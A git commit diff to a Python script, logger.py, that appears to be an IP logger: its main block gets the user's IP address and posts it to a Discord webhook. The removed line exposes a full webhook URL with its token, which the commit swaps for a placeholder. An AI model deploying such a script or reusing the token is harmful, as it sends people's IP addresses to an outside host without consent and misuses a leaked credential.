0528b1de850b5f31a06fb390a2b0946d52eeba01
Schuh <141640357+Schuh1337@users.noreply.github.com>
2024-02-15 15:23:41 +0100

    Update logger.py

--- logger.py
+++ logger.py
@@ -31,7 +31,7 @@ def send_to_webhook(webhook_url, ip_address):
         pass
 
 if __name__ == "__main__":
-    webhook_url = "https://discord.com/api/webhooks/1120331502853570631/DQTeRY7LQeCT7daVCnFJrzn2PLyIV74NVsJIy7rkkN3n8XJKGkbLiZxKA9dnK4FncLD5"
+    webhook_url = "webhook here"
     user_ip = get_ip()
     if user_ip:
         send_to_webhook(webhook_url, user_ip)
